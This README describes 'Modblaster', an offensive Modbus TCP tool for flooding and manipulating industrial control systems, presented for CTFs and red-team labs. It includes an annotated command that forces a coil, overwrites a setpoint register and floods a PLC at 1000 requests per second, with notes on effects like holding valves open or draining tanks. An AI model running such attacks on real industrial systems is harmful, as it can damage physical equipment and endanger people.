#  Modblaster

A high-speed Modbus toolkit for fuzzing, flooding, and real-time ICS manipulation.

Modblaster lets you:
- Force coils and write registers
- Use FC6, FC15, FC16, FC22, FC23
- Monitor registers and stop automatically on sensor triggers
- Perform advanced threading, random value flooding, and burst attack logic
- View live dashboards with `rich` and `tqdm`

**Perfect for CTFs, ICS red team labs, and offensive protocol analysis.**

## Usage Example

```bash
python3 modblaster.py \
  --host 172.19.4.9 \
  # IP address of the target Modbus TCP PLC
  --force-coil 2 \
  # Continuously forces coil #2 (boolean output) to TRUE
  # Useful to simulate holding an actuator open like a valve or pump
  --set-reg 1052 \
  # Write to holding register #1052, typically used to influence setpoints or flow rates
  --set-value 100 \
  # The value to write (e.g., set beer flow rate to 100) unless using --random-values
  --function-code 23 \
  # Use Modbus Function Code 23 (Read/Write Multiple Registers)
  # This reads 50 registers (by default) and writes 50 values at once
  # More powerful and less common than FC 6 or 16
  --duration 300 \
  # Total attack duration: 300 seconds = 5 minutes
  # After this, all flooding/monitoring threads stop
  --threads 50 \
  # Number of concurrent threads for register flooding
  # More threads = higher throughput (and stress on target)
  --rate 20 \
  # Each thread sends 20 requests/sec
  # Total = 50 x 20 = 1000 req/sec
  --coil-interval 0.25 \
  # Force coil #2 every 0.25 seconds
  # Simulates an actuator being repeatedly activated (e.g. hammering a solenoid)
  --monitor simple:0:le,0:stop_flood \
  # Add a monitor:
  # Type: `simple`
  # Reg: input register 0 (e.g., tank_level_sensor)
  # Condition: less than or equal to 0 (`le,0`)
  # Action: `stop_flood` — stops attack if condition is met
  # So: if tank_level_sensor hits 0, attack stops automatically
  --monitor-logic all \
  # Require ALL monitors to be true before stopping flood
  # (Useful when combining multiple conditions; here only one is defined)
  --statistics \
  # Enables tracking of request count, error rate, monitor triggers, etc.
  --progress \
  # Show live progress bar using `tqdm`
  # Gives real-time visual of how many requests have been sent
  --verbosity 2
  # Logging level: 0 = silent, 1 = info, 2 = debug
  # Level 2 shows full register values, thread actions, retries, monitor evaluations, etc.
```
## Background

This tool was developed while exploring OT/ICS attack surfaces in simulated industrial environments. Specifically, inspiration and iterative testing came while engaging with **Hack The Box's Pro Labs – Alchemy**.

It is designed to safely simulate and analyze Modbus TCP-based flooding, monitor triggering, and replay attacks, with features tailored to ICS environments. No actual production systems were harmed or accessed.

> This script is for **educational**, **research**, and **authorized testing** purposes only.

## Use Cases

- Flooding registers with random or fixed values
- Simulating ICS failures (tank overflow, dry-run sensors)
- Stress testing and load benchmarking PLC behavior
- Conditional shutdowns (stop flooding on safety sensor triggers)
- Passive sniffing & replay (future feature-ready)


## ⚠LEGAL NOTICE
This tool is released under the MIT License.

This tool is intended strictly for educational use, CTF competitions, or authorized security testing within lab/testbed environments.

Do not use this on any production ICS or SCADA system without explicit written permission from the system owner.

The author assumes no liability for any misuse, damage, or legal consequences resulting from unauthorized usage.

You are solely responsible for your actions. Know your scope. Hack ethically.



